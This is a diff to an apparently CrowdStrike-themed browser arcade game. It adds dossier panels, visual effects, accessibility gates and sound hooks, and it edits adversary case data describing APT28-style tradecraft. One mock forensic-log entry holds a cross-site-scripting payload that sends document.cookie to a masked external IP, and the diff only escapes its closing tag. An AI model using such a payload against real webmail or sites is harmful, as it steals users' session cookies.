+      // Phase 4: fire boss arrival stinger on secondary state transition (skip path)
+      if(this.#bannerBoss){ _ph4_fireBossArrival(); }
       return;
     }
     if(this.#state===STATE.WAVE_BANNER||this.#state===STATE.BOSS_WARNING){
@@ -24947,34 +27173,247 @@ class Game{
   }
 
   #drawWaveBanner(ctx,w,h){
+    // Phase 4: dispatch between basic wave banner and rich boss dossier
+    if(this.#bannerBoss){ this.#drawBossDossier(ctx,w,h); }
+    else { this.#drawWaveBannerBasic(ctx,w,h); }
+  }
+
+  #drawWaveBannerBasic(ctx,w,h){
     const t=this.#bannerT;
     const scl=0.5+Math.min(1,t*4)*0.5;
     const a=Math.min(1,t*3)*Math.max(0,1-(t-0.6)*2.5);
     ctx.save();ctx.globalAlpha=Math.max(0,a);
     ctx.translate(w/2,h/2);ctx.scale(scl,scl);ctx.translate(-w/2,-h/2);
     ctx.textAlign="center";
-    const phase=this.#currentPhase;
-    if(this.#bannerBoss){
-      ctx.font="bold 40px 'Courier New'";
-      ctx.fillStyle=CS.RED_GLOW;ctx.shadowColor=CS.RED_GLOW;ctx.shadowBlur=34;
-      ctx.fillText(`👾 ${phase?.shortName??"BOSS"} ${T('def_boss_incoming')}`,w/2,h/2-22);
-      ctx.font=FONT3_BOLD_14_CN;ctx.fillStyle=CS.ORANGE;ctx.shadowBlur=12;
-      ctx.fillText(T('def_high_threat'),w/2,h/2+26);
-    }else{
-      ctx.font="bold 50px 'Courier New'";
-      const g=ctx.createLinearGradient(0,0,w,0);
-      g.addColorStop(0,CS.RED);g.addColorStop(1,CS.ORANGE);
-      ctx.fillStyle=g;ctx.shadowColor=CS.RED;ctx.shadowBlur=26;
-      ctx.fillText(`${T('def_wave_label')}  ${this.#waveIdx+1}`,w/2,h/2-22);
-      ctx.font=FONT3_BOLD_14_CN;
-      ctx.fillStyle=CS.GREEN;ctx.shadowColor=CS.GREEN;ctx.shadowBlur=12;
-      ctx.fillText(T('def_falcon_deployed'),w/2,h/2+26);
-    }
+    ctx.font="bold 50px 'Courier New'";
+    const g=ctx.createLinearGradient(0,0,w,0);
+    g.addColorStop(0,CS.RED);g.addColorStop(1,CS.ORANGE);
+    ctx.fillStyle=g;ctx.shadowColor=CS.RED;ctx.shadowBlur=26;
+    ctx.fillText(`${T('def_wave_label')}  ${this.#waveIdx+1}`,w/2,h/2-22);
+    ctx.font=FONT3_BOLD_14_CN;
+    ctx.fillStyle=CS.GREEN;ctx.shadowColor=CS.GREEN;ctx.shadowBlur=12;
+    ctx.fillText(T('def_falcon_deployed'),w/2,h/2+26);
     if(this.#blinkSkip){
       ctx.font=FONT3_10_CN;ctx.fillStyle=CS.GREY;ctx.shadowBlur=0;
       ctx.fillText(T('def_skip'),w/2,h/2+50);
     }
     ctx.restore();
+  }
+
+  // Phase 4: Boss dossier — renders in screen space (NO scale transform).
+  // 500×300 centered panel with adversary name, AKA, nation, vector, TTPs, recommended counters.
+  // Staged reveal: scrim → panel frame → header → name/AKA → nation/threat → attackDesc → counters → SKIP hint
+  #drawBossDossier(ctx,w,h){
+    const t = this.#bannerT;
+    const phase = this.#currentPhase || {};
+    // Phase 5.A: responsive scale — grow panel on ultrawide (up to 1.35x), never shrink below 1440-wide identity.
+    const S = Math.min(1.35, Math.max(1.0, w/1440));
+    const panelW = Math.round(500*S), panelH = Math.round(300*S);
+    const px = (w - panelW)/2, py = (h - panelH)/2;
+    const PAD = Math.round(22*S);       // inner left padding for text
+    const PAD2 = Math.round(44*S);      // inner horizontal padding total (for maxW)
+    const BL = Math.round(14*S);        // corner bracket length
+    const HDR_H = Math.round(28*S);     // header band height
+    const NAME_Y = Math.round(64*S);
+    const AKA_Y  = Math.round(82*S);
+    const NAT_Y  = Math.round(100*S);
+    const VEC_Y  = Math.round(118*S);
+    const BODY_Y = Math.round(148*S);
+    const LINE_H = Math.round(15*S);
+    const CNT_Y  = Math.round(200*S);
+    const CHIP_Y = Math.round(214*S);
+    const CHIP_H = Math.round(22*S);
+    const CHIP_PAD = Math.round(18*S);  // chip label padding (x-total)
+    const CHIP_LY = Math.round(15*S);   // chip label baseline offset
+    const CHIP_LX = Math.round(9*S);    // chip label x-inset
+    const CHIP_GAP = Math.round(6*S);
+    const SKIP_DX = Math.round(14*S);
+    const SKIP_DY = Math.round(12*S);
+    const HDR_LX = Math.round(14*S);
+    const HDR_LY = Math.round(18*S);
+    const RADIUS = Math.max(6, Math.round(8*S));
+    const fName  = `bold ${Math.round(28*S)}px "Courier New"`;
+    const fHdrL  = `bold ${Math.round(10*S)}px "Courier New"`;
+    const fHdrR  = `bold ${Math.round(9*S)}px "Courier New"`;
+    const fMeta  = `bold ${Math.round(11*S)}px "Courier New"`;
+    const fBody  = `${Math.round(11*S)}px "Courier New"`;
+    const fCntL  = `bold ${Math.round(9*S)}px "Courier New"`;
+    const fChip  = `bold ${Math.round(10*S)}px "Courier New"`;
+    const fSkip  = `${Math.round(10*S)}px "Courier New"`;
+    // Staged progress
+    const scrimP  = _ph4_ezOutQuart(_ph4_rmP(Math.min(1,(t-0.00)/0.18)));
+    const frameP  = _ph4_ezOutQuart(_ph4_rmP(Math.min(1,(t-0.08)/0.22)));
+    const hdrP    = _ph4_ezOutQuart(_ph4_rmP(Math.min(1,(t-0.20)/0.28)));
+    const nameP   = _ph4_ezOutQuart(_ph4_rmP(Math.min(1,(t-0.34)/0.30)));
+    const metaP   = _ph4_ezOutQuart(_ph4_rmP(Math.min(1,(t-0.48)/0.32)));
+    const bodyP   = _ph4_ezOutQuart(_ph4_rmP(Math.min(1,(t-0.62)/0.34)));
+    const countP  = _ph4_ezOutQuart(_ph4_rmP(Math.min(1,(t-0.78)/0.30)));
+    // Background scrim
+    ctx.save();
+    ctx.globalAlpha = 0.72 * scrimP;
+    ctx.fillStyle = 'rgba(4,2,8,1)';
+    ctx.fillRect(0,0,w,h);
+    ctx.restore();
+    if(frameP<=0.01){ return; }
+    // Panel background + border
+    ctx.save();
+    ctx.globalAlpha = frameP;
+    ctx.fillStyle = 'rgba(14,6,10,0.94)';
+    ctx.beginPath(); ctx.roundRect(px, py, panelW, panelH, RADIUS); ctx.fill();
+    ctx.strokeStyle = CS.RED_GLOW || '#ff4466';
+    ctx.lineWidth = Math.max(1.2, 1.8*Math.min(S,1.2));
+    ctx.shadowColor = CS.RED_GLOW || '#ff4466';
+    ctx.shadowBlur = Math.round(18*Math.min(S,1.2));
+    ctx.stroke();
+    ctx.shadowBlur = 0;
+    // Corner brackets (military-grade dossier marks)
+    ctx.strokeStyle = 'rgba(255,90,120,0.85)';
+    ctx.lineWidth = Math.max(1.4, 2*Math.min(S,1.2));
+    [[px,py],[px+panelW,py],[px,py+panelH],[px+panelW,py+panelH]].forEach(([bx,by],i)=>{
+      ctx.beginPath();
+      if(i===0){ ctx.moveTo(bx,by+BL); ctx.lineTo(bx,by); ctx.lineTo(bx+BL,by); }
+      if(i===1){ ctx.moveTo(bx-BL,by); ctx.lineTo(bx,by); ctx.lineTo(bx,by+BL); }
+      if(i===2){ ctx.moveTo(bx,by-BL); ctx.lineTo(bx,by); ctx.lineTo(bx+BL,by); }
+      if(i===3){ ctx.moveTo(bx-BL,by); ctx.lineTo(bx,by); ctx.lineTo(bx,by-BL); }
+      ctx.stroke();
+    });
+    ctx.restore();
+    // Header band (CLASSIFIED • CONTACT DETECTED)
+    if(hdrP>0.01){
+      ctx.save();
+      ctx.globalAlpha = hdrP;
+      ctx.fillStyle = 'rgba(100,8,14,0.88)';
+      ctx.beginPath(); ctx.roundRect(px, py, panelW, HDR_H, [RADIUS,RADIUS,0,0]); ctx.fill();
+      ctx.textAlign = 'left';
+      ctx.fillStyle = '#ffd5d5';
+      ctx.font = fHdrL;
+      ctx.fillText(T('ph4_boss_contact'), px+HDR_LX, py+HDR_LY);
+      ctx.textAlign = 'right';
+      ctx.fillStyle = 'rgba(255,200,200,0.68)';
+      ctx.font = fHdrR;
+      ctx.fillText('// THREAT INTEL · EYES-ONLY', px+panelW-HDR_LX, py+HDR_LY);
+      ctx.restore();
+    }
+    // Adversary name (big, red-glow) + AKA + Nation
+    if(nameP>0.01){
+      ctx.save();
+      ctx.globalAlpha = nameP;
+      ctx.textAlign = 'left';
+      const nameStr = String(phase.name || 'UNKNOWN');
+      ctx.font = fName;
+      ctx.fillStyle = CS.RED_GLOW || '#ff6a84';
+      ctx.shadowColor = CS.RED_GLOW || '#ff6a84';
+      ctx.shadowBlur = Math.round(16*Math.min(S,1.2));
+      ctx.fillText(nameStr, px+PAD, py+NAME_Y);
+      ctx.shadowBlur = 0;
+      ctx.restore();
+    }
+    if(metaP>0.01){
+      ctx.save();
+      ctx.globalAlpha = metaP;
+      ctx.textAlign = 'left';
+      // AKA
+      ctx.fillStyle = 'rgba(210,180,190,0.82)';
+      ctx.font = fMeta;
+      const akaStr = phase.aka ? ('a.k.a. ' + String(phase.aka)) : '';
+      if(akaStr){
+        const akaWMax = panelW - PAD2;
+        let a = akaStr;
+        if(ctx.measureText(a).width > akaWMax){
+          while(a.length>3 && ctx.measureText(a+'…').width > akaWMax) a = a.slice(0,-1);
+          a += '…';
+        }
+        ctx.fillText(a, px+PAD, py+AKA_Y);
+      }
+      // Nation + threat
+      ctx.fillStyle = 'rgba(255,175,130,0.88)';
+      ctx.font = fMeta;
+      const nationStr = String(phase.nation || '');
+      const threatStr = phase.threat ? ('· ' + phase.threat) : '';
+      ctx.fillText(`${nationStr} ${threatStr}`, px+PAD, py+NAT_Y);
+      // Vector
+      ctx.fillStyle = 'rgba(150,200,230,0.85)';
+      ctx.font = fBody;
+      const vectorStr = phase.vector ? ('Vector: ' + phase.vector) : '';
+      if(vectorStr){
+        let v = vectorStr;
+        const vWMax = panelW - PAD2;
+        if(ctx.measureText(v).width > vWMax){
+          while(v.length>3 && ctx.measureText(v+'…').width > vWMax) v = v.slice(0,-1);
+          v += '…';
+        }
+        ctx.fillText(v, px+PAD, py+VEC_Y);
+      }
+      ctx.restore();
+    }
+    // TTPs / attackDesc (wraps, 2 lines max)
+    if(bodyP>0.01){
+      ctx.save();
+      ctx.globalAlpha = bodyP;
+      ctx.textAlign = 'left';
+      ctx.fillStyle = '#d8e6f0';
+      ctx.font = fBody;
+      const body = String(phase.attackDesc || '');
+      const maxW = panelW - PAD2;
+      // Wrap manually
+      const words = body.split(/\s+/);
+      const lines = [];
+      let line = '';
+      for(const w0 of words){
+        const test = line ? (line + ' ' + w0) : w0;
+        if(ctx.measureText(test).width > maxW && line){ lines.push(line); line = w0; }
+        else line = test;
+      }
+      if(line) lines.push(line);
+      const show = lines.slice(0,2);
+      if(lines.length>2){
+        // Ellipsize 2nd line
+        let last = show[1];
+        while(last.length>3 && ctx.measureText(last+'…').width > maxW) last = last.slice(0,-1);
+        show[1] = last + '…';
+      }
+      let y = py+BODY_Y;
+      for(const ln of show){ ctx.fillText(ln, px+PAD, y); y += LINE_H; }
+      ctx.restore();
+    }
+    // Recommended counters (module chips)
+    if(countP>0.01){
+      ctx.save();
+      ctx.globalAlpha = countP;
+      ctx.textAlign = 'left';
+      ctx.fillStyle = 'rgba(180,210,235,0.82)';
+      ctx.font = fCntL;
+      ctx.fillText(T('ph4_boss_counter'), px+PAD, py+CNT_Y);
+      // Chips row
+      const mods = Array.isArray(phase.keyModules) ? phase.keyModules.slice(0,4) : [];
+      let cx = px+PAD;
+      const cy = py+CHIP_Y;
+      ctx.font = fChip;
+      const chipR = Math.max(3, Math.round(4*S));
+      for(const m of mods){
+        const label = String(m || '').replace(/_/g,' ');
+        const cwid = ctx.measureText(label).width + CHIP_PAD;
+        ctx.fillStyle = 'rgba(8,18,30,0.88)';
+        ctx.beginPath(); ctx.roundRect(cx, cy, cwid, CHIP_H, chipR); ctx.fill();
+        ctx.strokeStyle = 'rgba(92,200,255,0.70)';
+        ctx.lineWidth = 1;
+        ctx.stroke();
+        ctx.fillStyle = '#c8ecff';
+        ctx.fillText(label, cx+CHIP_LX, cy+CHIP_LY);
+        cx += cwid + CHIP_GAP;
+      }
+      ctx.restore();
+    }
+    // SKIP hint (bottom-right of panel)
+    if(this.#blinkSkip){
+      ctx.save();
+      ctx.globalAlpha = 0.78;
+      ctx.textAlign = 'right';
+      ctx.fillStyle = 'rgba(200,215,230,0.70)';
+      ctx.font = fSkip;
+      ctx.fillText(T('def_skip'), px+panelW-SKIP_DX, py+panelH-SKIP_DY);
+      ctx.restore();
+    }
   }
 
   #drawPauseOverlay(ctx,w,h){
@@ -24995,13 +27434,16 @@ class Game{
 
   #drawGameOver(ctx,w,h){
     const dc=this.#deathCtx;
+    // Phase 4: fire loss weight stinger once per game-over
+    if(!_ph4_loseStingerFired){ _ph4_loseStingerFired=true; _ph4_fireLossWeight(); }
     ctx.save();ctx.globalAlpha=Math.min(1,this.#goT/0.6);
     ctx.fillStyle="rgba(4,1,12,0.86)";ctx.fillRect(0,0,w,h);
     ctx.fillStyle=CS.RED;ctx.fillRect(0,0,w,4);ctx.fillRect(0,h-4,w,4);
     ctx.save();ctx.textAlign="center";
     ctx.font=FONT3_BOLD_38_CN;
+    // Phase 4: chromatic aberration on the title (red/cyan split)
+    _ph4_drawChromatic(ctx, T('def_adv_persist'), w/2, h*0.13, CS.RED_GLOW, FONT3_BOLD_38_CN, 1.6);
     ctx.fillStyle=CS.RED_GLOW;ctx.shadowColor=CS.RED_GLOW;ctx.shadowBlur=32;
-    ctx.fillText(T('def_adv_persist'),w/2,h*0.13);
     if(dc){
       const px=50,py=h*0.21,pw=w-100,ph=182;
       ctx.fillStyle="rgba(8,2,26,0.94)";ctx.strokeStyle=CS.RED;ctx.lineWidth=1.5;
@@ -25037,17 +27479,41 @@ class Game{
       ctx.fillStyle=CS.ORANGE;ctx.shadowColor=CS.ORANGE;
       ctx.fillText(`${T('def_record')}: ${formatLocaleNumber(this.#hi)}`,w/2,h*0.81);
     }
-    ctx.font=FONT3_BOLD_13_CN;ctx.fillStyle=CS.WHITE;ctx.shadowBlur=0;
-    ctx.fillText(T('def_redeploy'),w/2,h*0.88);
+    // ═══════════ Phase 4: pulsing REDEPLOY CTA (amber, blink-gated) ═══════════
+    {
+      const blinkOn = (Math.floor(Date.now()/380)%2===0);
+      const ctaY = h*0.88;
+      if(blinkOn){
+        ctx.font = 'bold 15px "Courier New"';
+        ctx.fillStyle = '#ffd68a';
+        ctx.shadowColor = '#ffb347';
+        ctx.shadowBlur = 14;
+        ctx.fillText(T('def_redeploy'), w/2, ctaY);
+        ctx.font = FONT3_BOLD_11_CN;
+        ctx.fillStyle = 'rgba(255,214,138,0.82)';
+        ctx.shadowBlur = 8;
+        ctx.fillText(T('ph4_press_redeploy'), w/2, ctaY + 18);
+      } else {
+        ctx.font = 'bold 15px "Courier New"';
+        ctx.fillStyle = 'rgba(255,214,138,0.38)';
+        ctx.shadowBlur = 0;
+        ctx.fillText(T('def_redeploy'), w/2, ctaY);
+        ctx.font = FONT3_BOLD_11_CN;
+        ctx.fillStyle = 'rgba(255,214,138,0.28)';
+        ctx.fillText(T('ph4_press_redeploy'), w/2, ctaY + 18);
+      }
+    }
     ctx.font=FONT3_BOLD_10_CN;
     ctx.fillStyle=CS.RED;ctx.shadowColor=CS.RED;ctx.shadowBlur=8;
-    ctx.fillText(T('g_crowdstrike_tagline_short'),w/2,h*0.94);
+    ctx.fillText(T('g_crowdstrike_tagline_short'),w/2,h*0.95);
     ctx.restore(); // close textAlign save
     ctx.restore(); // close fade-in globalAlpha
   }
 
   #drawYouWin(ctx,w,h){
     const wt=this.#winT;
+    // Phase 4: fire victory release stinger once per game-end
+    if(!_ph4_winStingerFired){ _ph4_winStingerFired=true; _ph4_fireVictoryRelease(); }
     ctx.save();ctx.globalAlpha=Math.min(1,wt/0.55);
     ctx.fillStyle="rgba(4,1,12,0.86)";ctx.fillRect(0,0,w,h);
     // Particle burst: 40 stars radiate from centre during first 1.2s
@@ -25084,6 +27550,100 @@ class Game{
       ctx.fillStyle=CS.ORANGE;ctx.shadowColor=CS.ORANGE;
       ctx.fillText(`${T('def_record')}: ${formatLocaleNumber(this.#hi)}`,w/2,h*0.65);
     }
+    // ═══════════ Phase 4: TURNING POINTS strip (3 cells) ═══════════
+    {
+      const tpP = _ph4_ezOutQuart(_ph4_rmP(Math.min(1,(wt-0.45)/0.55)));
+      if(tpP>0.01){
+        const tpY = h*0.595;
+        const tpH = 34;
+        const tpW = 132;
+        const tpGap = 14;
+        const totalW = tpW*3 + tpGap*2;
+        const tpX0 = (w - totalW)/2;
+        ctx.save(); ctx.globalAlpha = tpP;
+        ctx.font = 'bold 9px "Courier New"';
+        ctx.textAlign = 'center';
+        // Strip header
+        ctx.fillStyle = 'rgba(180,200,230,0.58)';
+        ctx.fillText(T('iz_turning_point'), w/2, tpY - 10);
+        // Cell data: [label, value]
+        const maxCombo = (typeof this.#maxCombo === 'number') ? this.#maxCombo : (this.#combo||0);
+        const waves = (typeof this.#waveIdx === 'number') ? (this.#waveIdx+1) : 0;
+        const advName = (this.#currentPhase && this.#currentPhase.name) ? this.#currentPhase.name : '—';
+        const cells = [
+          [T('ph4_tp_def_combo'), String(maxCombo||0)],
+          [T('ph4_tp_def_waves'), String(waves)],
+          [T('ph4_tp_def_adv'),   String(advName)]
+        ];
+        for(let i=0;i<3;i++){
+          const cellP = _ph4_cinStagger(tpP, i, 0.18, 0.35);
+          if(cellP<=0.01) continue;
+          const cx = tpX0 + i*(tpW+tpGap);
+          ctx.save(); ctx.globalAlpha = tpP * cellP;
+          // Cell bg
+          ctx.fillStyle = 'rgba(12,18,28,0.72)';
+          ctx.beginPath(); ctx.roundRect(cx, tpY, tpW, tpH, 4); ctx.fill();
+          // Cell border
+          ctx.strokeStyle = 'rgba(90,160,220,0.45)';
+          ctx.lineWidth = 1;
+          ctx.stroke();
+          // Label
+          ctx.fillStyle = 'rgba(140,170,200,0.78)';
+          ctx.font = 'bold 8px "Courier New"';
+          ctx.fillText(cells[i][0], cx + tpW/2, tpY + 11);
+          // Value
+          ctx.fillStyle = '#e8f2ff';
+          ctx.font = 'bold 12px "Courier New"';
+          let val = cells[i][1];
+          if(val.length>14) val = val.slice(0,13)+'…';
+          ctx.fillText(val, cx + tpW/2, tpY + 26);
+          ctx.restore();
+        }
+        ctx.restore();
+      }
+    }
+    // ═══════════ Phase 4: MODULE VALIDATED chip (top-right) ═══════════
+    {
+      const chipP = _ph4_ezOutQuart(_ph4_rmP(Math.min(1,(wt-0.30)/0.50)));
+      if(chipP>0.01){
+        const chipLabel = T('iz_module_validated');
+        const chipSub   = T('iz_module_validated_sub');
+        ctx.save();
+        ctx.font = FONT3_BOLD_10_CN;
+        const wLbl = ctx.measureText(chipLabel).width;
+        ctx.font = FONT3_11_CN;
+        const wSub = ctx.measureText(chipSub).width;
+        const chipW = Math.min(340, Math.max(wLbl, wSub) + 28);
+        const chipH = 38;
+        const chipX = w - chipW - 28;
+        const chipYoff = -12 + 12*chipP;
+        const chipY = 24 + chipYoff;
+        ctx.globalAlpha = chipP;
+        // Chip bg
+        ctx.fillStyle = 'rgba(8,14,22,0.82)';
+        ctx.beginPath(); ctx.roundRect(chipX, chipY, chipW, chipH, 6); ctx.fill();
+        // Falcon cyan border
+        ctx.strokeStyle = 'rgba(92,200,255,0.85)';
+        ctx.lineWidth = 1.25;
+        ctx.shadowColor = 'rgba(92,200,255,0.55)';
+        ctx.shadowBlur = 10;
+        ctx.stroke();
+        ctx.shadowBlur = 0;
+        // Checkmark icon dot
+        ctx.fillStyle = '#5cc8ff';
+        ctx.beginPath(); ctx.arc(chipX + 12, chipY + chipH/2, 3, 0, Math.PI*2); ctx.fill();
+        // Label + sub
+        ctx.textAlign = 'left';
+        ctx.fillStyle = '#e8f6ff';
+        ctx.font = FONT3_BOLD_10_CN;
+        ctx.fillText(chipLabel, chipX + 22, chipY + 15);
+        ctx.fillStyle = 'rgba(180,210,235,0.78)';
+        ctx.font = FONT3_11_CN;
+        ctx.fillText(chipSub, chipX + 22, chipY + 30);
+        ctx.restore();
+      }
+    }
+    ctx.textAlign="center";
     ctx.font=FONT3_BOLD_13_CN;ctx.fillStyle=CS.WHITE;ctx.shadowBlur=0;
     ctx.fillText(T('def_play_again'),w/2,h*0.77);
     ctx.font=FONT3_BOLD_11_CN;
@@ -25344,6 +27904,44 @@ function initGameHunt() {
   if (_initGameHunt_initialized) { return; }
   _initGameHunt_initialized = true;
   (function() {
+// ─── Phase 4 cinematic helpers (Hunt IIFE-private, portable copies) ─────
+function _ph4_ezOutQuart(p){ if(p<=0)return 0; if(p>=1)return 1; return 1-Math.pow(1-p,4); }
+function _ph4_cinOvershoot(p){ if(p<=0)return 0; if(p>=1)return 1; const s=1.35; return 1+(s+1)*Math.pow(p-1,3)+s*Math.pow(p-1,2); }
+function _ph4_cinStagger(p, i, step, ramp){
+  const start = i*step;
+  return Math.max(0, Math.min(1, (p - start) / Math.max(0.001, ramp)));
+}
+function _ph4_rmP(p){ return window._reduceMotion ? 1 : p; }
+function _ph4_drawChromatic(cx, str, x, y, baseFill, font, shift){
+  // Phase 5.B: reduced-motion gate — single-pass fill, no RGB split (accessibility / photosensitivity).
+  if(window._reduceMotion){
+    cx.save();
+    cx.font = font;
+    cx.textAlign = 'center';
+    cx.fillStyle = baseFill;
+    cx.fillText(str, x, y);
+    cx.restore();
+    return;
+  }
+  cx.save();
+  cx.font = font;
+  cx.textAlign = 'center';
+  cx.globalAlpha = 0.38;
+  cx.fillStyle = 'rgba(255,80,80,1)';
+  cx.fillText(str, x - shift, y);
+  cx.fillStyle = 'rgba(80,220,255,1)';
+  cx.fillText(str, x + shift, y);
+  cx.globalAlpha = 1;
+  cx.fillStyle = baseFill;
+  cx.fillText(str, x, y);
+  cx.restore();
+}
+let _ph4_winStingerFired = false;
+let _ph4_loseStingerFired = false;
+let _ph4_bossRevealFired  = false;
+function _ph4_fireHuntVictory(){ try{ (window.SoundEngine?.stinger?.fire?.('hunt_victory_release')) || window.ArcadeSonic?.playHuntVictoryRelease?.(); }catch(_){} }
+function _ph4_fireHuntLoss(){ try{ (window.SoundEngine?.stinger?.fire?.('hunt_loss_weight')) || window.ArcadeSonic?.playHuntLossWeight?.(); }catch(_){} }
+function _ph4_fireBossArrival(){ try{ (window.SoundEngine?.stinger?.fire?.('boss_arrival_reveal')) || window.ArcadeSonic?.playBossArrivalReveal?.(); }catch(_){} }
 // ════════════════════════════════════════════════════════════════
 //  FALCON RANKING SYSTEM  v1.0  —  Threat Hunt Edition
 // ════════════════════════════════════════════════════════════════
@@ -26514,7 +29112,7 @@ const ADVERSARIES=[
       {phase:2,type:'TIMING',icon:'⏰',title:'Moscow Hours — Holiday Blank',text:'All activity 09:00-18:00 Moscow Standard Time. No activity on Russian public holidays — Defender of the Fatherland Day blank confirmed.',ttp:'Working Hours TTP',clue:'Russian official holiday blank confirms GRU professional intelligence officers, not contractors.',hint:'government'},
       {phase:2,type:'IDENTITY',icon:'🪪',title:'Impossible Travel via Ukraine VPN',text:'Same credential used from Warsaw and Moscow within 4 minutes. VPN routed through Ukrainian ISP to mask GRU origin.',ttp:'T1078 — Valid Accounts',clue:'Ukrainian VPN routing for impossible travel masking is APT28 standard counter-forensics.',hint:'government'},
       {phase:2,type:'LATERAL',icon:'↔️',title:'WMIC Living-off-the-Land',text:'WMIC.exe used for remote process creation across 14 hosts. Pure living-off-the-land. Zero custom malware written to disk.',ttp:'T1047 — Windows Management Instrumentation',clue:'LOTL via WMIC targets environments where malware detection is the primary security control.',hint:'government'},
-      {phase:3,type:'EXFIL',icon:'📤',title:'Data Staged and Chunked',text:'Data compressed using certutil, staged in AppData, encrypted with AES, then uploaded in 4MB chunks to avoid DLP size thresholds.',ttp:'T1002 — Data Compressed',clue:'Chunk-based upload under DLP threshold confirms target has data loss prevention on outbound.',hint:'government',artifact:{kind:'forensic_log',source:'Roundcube-access',eventId:'XSS-CVE-2024-37383',pid:0,processName:'roundcube-webmail',commandLine:'<script>fetch(\'//185.x.x.x/c?=\'+document.cookie)</script>',parent:'victim-user-session'}},
+      {phase:3,type:'EXFIL',icon:'📤',title:'Data Staged and Chunked',text:'Data compressed using certutil, staged in AppData, encrypted with AES, then uploaded in 4MB chunks to avoid DLP size thresholds.',ttp:'T1002 — Data Compressed',clue:'Chunk-based upload under DLP threshold confirms target has data loss prevention on outbound.',hint:'government',artifact:{kind:'forensic_log',source:'Roundcube-access',eventId:'XSS-CVE-2024-37383',pid:0,processName:'roundcube-webmail',commandLine:'<script>fetch(\'//185.x.x.x/c?=\'+document.cookie)<\/script>',parent:'victim-user-session'}},
       {phase:3,type:'EXFIL',icon:'📤',title:'16GB of NATO Documents',text:'16GB of government communications, delegation files, and classified summit briefings staged for exfiltration. Summit security now compromised.',ttp:'T1041 — Exfiltration Over C2 Channel',clue:'16GB volume matches the Bundestag 2015 exfil. Target is a national parliament or NATO institution.',hint:'government',artifact:{kind:'osint_post',platform:'telegram',handle:'@DCLeaks_2026',body:'NATO COMMS LEAK 1/4 — 12GB archive. Draft directives, officer rosters. More in 48h.',timestamp:'2026-04-02 18:00 UTC'}},
       {phase:3,type:'STAGING',icon:'📦',title:'72-Hour Summit Window',text:'Summit is 72 hours away. Intelligence value of delegation communications peaks at the meeting time. GRU is accelerating extraction.',ttp:'T1589 — Gather Victim Identity Information',clue:'Time-critical extraction confirms GRU requires intelligence before a specific diplomatic event.',hint:'military'},
       {phase:3,type:'IMPACT',icon:'💥',title:'DNC — Bundestag — NATO Trilogy',text:'TTP continuity across DNC 2016, Bundestag 2015, and this operation confirms GRU Unit 26165 systematic targeting of Western democratic institutions.',ttp:'Historical TTP',clue:'Three-operation TTP continuity confirms the same GRU unit — this is a campaign, not an incident.',hint:'government'},
@@ -32688,6 +35286,58 @@ function drawBriefing(dt){
     ctx.fillStyle=`rgba(170,0,255,${_scanA})`; ctx.fillRect(LW/2-_brW/2,_pt,_brW,_brH);
   }
 
+  // ═══════════ Phase 4: adversary sigil (header-band upper-left) ═══════════
+  // Deterministic glyph from adversary id; scanline reveal gated by T1.
+  {
+    const _sigilT = T1;
+    if(_sigilT > 0.01){
+      const _sigilX = LW/2 - _brW/2 + Math.round(40*ui);
+      const _sigilY = _pt + Math.round(_hdrBandH/2);
+      const _sigilR = Math.round(14*ui);
+      ctx.save();
+      ctx.globalAlpha = _sigilT;
+      // Deterministic seed from adversary id
+      const _sidKey = String(selectedCase?.id || adv.name || 'x');
+      let _sh = 2166136261>>>0;
+      for(let i=0;i<_sidKey.length;i++){ _sh = Math.imul(_sh ^ _sidKey.charCodeAt(i), 16777619)>>>0; }
+      const _srand = (s)=>{ let x = (s+1)*9301+49297; return ((x|0)%233280)/233280; };
+      // Outer ring
+      ctx.strokeStyle = adv.color;
+      ctx.lineWidth = 1.5;
+      ctx.shadowColor = adv.color;
+      ctx.shadowBlur = 8;
+      ctx.beginPath(); ctx.arc(_sigilX, _sigilY, _sigilR, 0, Math.PI*2); ctx.stroke();
+      ctx.shadowBlur = 0;
+      // Inner geometry: 3 radial ticks + glyph spokes
+      const _spokes = 3 + Math.floor(_srand(_sh%97)*4);
+      for(let i=0;i<_spokes;i++){
+        const a = (_srand((_sh>>>(i*3))&0xff) * Math.PI*2);
+        const r1 = _sigilR*0.35, r2 = _sigilR*0.88;
+        ctx.beginPath();
+        ctx.moveTo(_sigilX+Math.cos(a)*r1, _sigilY+Math.sin(a)*r1);
+        ctx.lineTo(_sigilX+Math.cos(a)*r2, _sigilY+Math.sin(a)*r2);
+        ctx.strokeStyle = adv.color;
+        ctx.lineWidth = 1;
+        ctx.globalAlpha = _sigilT * (0.55 + 0.35*_srand(i+17));
+        ctx.stroke();
+      }
+      // Central dot
+      ctx.globalAlpha = _sigilT;
+      ctx.fillStyle = adv.color;
+      ctx.beginPath(); ctx.arc(_sigilX, _sigilY, Math.max(1.2, _sigilR*0.12), 0, Math.PI*2); ctx.fill();
+      // Scanline reveal sweep (top→bottom) during T1 ramp
+      if(_sigilT < 1){
+        const _sweepY = _sigilY - _sigilR + _sigilT*(_sigilR*2);
+        ctx.save();
+        ctx.beginPath(); ctx.arc(_sigilX, _sigilY, _sigilR, 0, Math.PI*2); ctx.clip();
+        ctx.fillStyle = `rgba(255,255,255,${0.12*(1-_sigilT)})`;
+        ctx.fillRect(_sigilX-_sigilR, _sweepY-1, _sigilR*2, 2);
+        ctx.restore();
+      }
+      ctx.restore();
+    }
+  }
+
   // ── T2: Adversary name — zoom + glow ──────────────────────────
   ctx.globalAlpha=T2; ctx.textAlign='center';
   const _nameScale=1+(1-T2)*0.18; // starts 18% bigger, shrinks to 1.0
@@ -32810,6 +35460,8 @@ function spawnBreachParticles(){
 function drawIntercept(dt){
   const adv=getAdvLocale(selectedCase);
   const ui = huntUiScale();
+  // Phase 4: fire hunt victory release stinger once per case end
+  if(!_ph4_winStingerFired){ _ph4_winStingerFired = true; _ph4_fireHuntVictory(); }
   ctx.save(); ctx.globalAlpha=Math.min(1, interceptT/0.55);
   ctx.fillStyle='#020308'; ctx.fillRect(0,0,LW,LH); drawStars();
   // World map in background
@@ -32832,9 +35484,54 @@ function drawIntercept(dt){
   ctx.font=huntFont(22,'bold'); ctx.fillStyle='#FFD700'; ctx.shadowColor='#FFD700'; ctx.shadowBlur=12; ctx.fillText(`${T('g_score')}: ${formatLocaleNumber(score)}`,LW/2,LH/2+38); ctx.shadowBlur=0;
   ctx.font=huntFont(15,'bold'); ctx.fillStyle='#39FF14'; ctx.shadowColor='#39FF14'; ctx.shadowBlur=8; ctx.fillText(`${T('h_rank_label')}: ${grade}`,LW/2,LH/2+64); ctx.shadowBlur=0;
